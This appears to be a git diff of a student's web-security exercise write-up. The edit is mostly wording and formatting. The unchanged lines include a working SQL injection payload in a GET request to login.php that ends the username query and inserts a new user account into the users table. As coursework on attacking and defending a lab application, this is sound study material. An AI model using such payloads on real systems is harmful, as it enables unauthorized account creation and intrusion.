@@ -268,15 +268,17 @@ __Solution:__
 __2. Briefly describe the actions required to create a new user.__
 
 __solution__ 
-- Since tablename, column names are known, append to the login request by terminating the username query and by insert the new user.
+- Since tablename, column names are known, append to the login request by terminating the username query and by inserting the new user query.
     payload used
 
     ```php
         GET /htdocs/login.php?username=alex'; INSERT INTO users(id, username, password,name,firstname) VALUES(99999,"charlie", "password123", 'charlie','chaplin')#&password=asd&password=test123
     ```
     ![new_user](assets/new_user.png)
-    <br>
-    ![loggedin_new_user](assets/loggedin_new_user.PNG)
+    <br>  <br>  <br>
+    ![loggedin_new_user](assets/loggedin_new_user.PNG) 
+
+    
 
 __3. Give an additional precaution (apart from those you have given already) that
 may prevent this manipulation.__
